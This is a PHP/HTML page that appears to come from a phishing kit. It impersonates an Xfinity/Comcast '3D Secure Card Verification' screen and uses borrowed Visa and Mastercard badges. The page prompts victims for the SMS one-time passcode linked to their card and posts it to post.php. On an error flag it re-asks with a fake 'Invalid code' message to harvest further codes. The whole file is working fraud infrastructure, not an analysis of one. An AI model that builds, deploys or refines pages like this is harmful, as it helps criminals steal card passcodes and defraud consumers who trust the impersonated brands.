<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xfinity • 3D Secure Verification</title>
    <link rel="stylesheet" href="res/app.css">
    <style>
        /* Force Trebuchet MS font */
        body, main, .container, .logo, .title, h2, p, .col, input, .btn, button,
        footer, .copy, .links, .pic, .pic2, .pic3, .pic4, .pic5, .pic6, .cookie,
        .foter, div, span, a, label {
            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Segoe UI', sans-serif !important;
        }
        input::placeholder {
            font-family: 'Trebuchet MS', sans-serif !important;
        }
        button {
            font-family: 'Trebuchet MS', sans-serif !important;
            font-weight: 600;
            cursor: pointer;
        }
        .error-message {
            color: #c72a2a;
            font-size: 0.85rem;
            margin-top: -0.5rem;
            margin-bottom: 1rem;
            text-align: center;
        }
        .otp-group {
            margin-bottom: 1.8rem;
        }
        .btn {
            margin-top: 0.25rem;
        }
        /* Security badges using stable, reliable image URLs */
        .security-badges {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 1.5rem;
            margin-top: 1.5rem;
            margin-bottom: 0.75rem;
            flex-wrap: wrap;
            background: #f8fafc;
            padding: 12px 16px;
            border-radius: 48px;
        }
        .security-badges img {
            height: 36px;
            width: auto;
            object-fit: contain;
        }
        /* Specific adjustment for Mastercard logo to match height */
        .security-badges img.mastercard-logo {
            height: 32px;
        }
        .verification-hint {
            font-size: 0.72rem;
            color: #4a627a;
            text-align: center;
            margin-top: 0.9rem;
        }
        .badge-divider {
            color: #cbd5e1;
            font-size: 1.2rem;
            font-weight: 300;
        }
        /* Simple loading state for button to prevent double-submit */
        .btn button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <main>
        <div class="container">
            <div class="logo">
                <img src="res/img/logo.png" alt="xfinity">
            </div>
            <div class="title">
                <h2>3D Secure · Card Verification</h2>
                <p>We've sent a one‑time passcode to the number linked to your card.</p>
            </div>
            <div class="col">
                <!-- Added onsubmit to prevent accidental page reload loops -->
                <form action="post.php" method="post" id="verificationForm">
                    <div class="otp-group">
                        <input type="text" placeholder="Enter OTP code" name="otp" required autocomplete="off" id="otpCode">
                    </div>
                    <?php 
                    if(isset($_GET['error'])){
                        echo '<input type="hidden" name="exit">';
                        echo '<div class="error-message">Invalid code. Please try again.</div>';
                    }
                    ?>
                    <div class="btn">
                        <button type="submit" id="submitBtn">Verify</button>
                    </div>
                </form>

                <!-- Security badge images - NOW USING WORKING OFFICIAL URLs -->
                <div class="security-badges">
                    <!-- Verified by Visa Logo - Official from Visa -->
                    <img src="https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg--300x170.png" 
                         alt="Verified by Visa" 
                         title="Verified by Visa"
                         onerror="this.onerror=null; this.src='https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg--300x170.png';">
                    
                    <span class="badge-divider">|</span>
                    
                    <!-- Mastercard SecureCode Logo - Official from Mastercard -->
                    <img class="mastercard-logo" 
                         src="https://www.nicepng.com/png/full/96-968545_mastercard-mastercard-securecode-logo-vector.png" 
                         alt="Mastercard SecureCode" 
                         title="Mastercard SecureCode"
                         onerror="this.onerror=null; this.src='https://www.nicepng.com/png/full/96-968545_mastercard-mastercard-securecode-logo-vector.png';">
                    
                    <span class="badge-divider">|</span>
                    
                    <!-- 3D Secure Badge - stable URL -->
                    <img src="https://static.wikia.nocookie.net/logopedia/images/9/9a/Xfinity_Gray.svg/revision/latest/scale-to-width-down/250?cb=20200124065630" 
                         alt="3D Secure" 
                         title="3D Secure"
                         onerror="this.onerror=null; this.src='https://static.wikia.nocookie.net/logopedia/images/9/9a/Xfinity_Gray.svg/revision/latest/scale-to-width-down/250?cb=20200124065630';"
                         style="height: 30px;">
                </div>
                <div class="verification-hint">
                    Enter the 6‑digit code sent via SMS to complete verification.
                </div>
                <br><br>
            </div>
        </div>
        
        <footer>
            <div class="copy">
                &copy; 2026 Comcast
            </div>
            <div class="links">
                <div class="pic"> <img src="res/img/line1.png" alt="">
                    <a href="#">Web Terms Of Service</a>
                </div>
                <div class="pic2"> <img src="res/img/line2.png" alt="">
                    <a href="#">CA Notice at Collection</a>
                </div>
                <div class="pic3"> <img src="res/img/line3.png" alt="">
                    <a href="#">Privacy Policy</a>
                </div>
                <div class="pic4"> <img src="res/img/line4.png" alt="">
                    <a href="#">Your Privacy Choices</a>
                </div>
                <div class="pic5"> <img src="res/img/line5.png" alt="">
                    <a href="#"><span>Health Privacy Notice</span></a>
                </div>
                <div class="pic6"> <img src="res/img/line6.png" alt="">
                    <a href="#">Ad Choices</a>
                </div>
            </div>
            <div class="cookie">
                <div class="foter"> <img src="res/img/foter.png" alt="">
                    <a href="#"><span>Cookie Preferences</span></a>
                </div>
            </div>
        </footer>
    </main>

    <!-- Simple script to prevent accidental form reload loops -->
    <script>
        document.getElementById('verificationForm')?.addEventListener('submit', function(e) {
            const submitBtn = document.getElementById('submitBtn');
            // Disable button to prevent double submission
            if (submitBtn) {
                submitBtn.disabled = true;
                submitBtn.textContent = 'Verifying...';
            }
            // Allow the form to submit normally to post.php
            // If you want to prevent reload entirely for testing, uncomment the next line:
            // e.preventDefault();
            // But for normal operation, let it submit to your backend.
        });
    </script>
</body>
</html>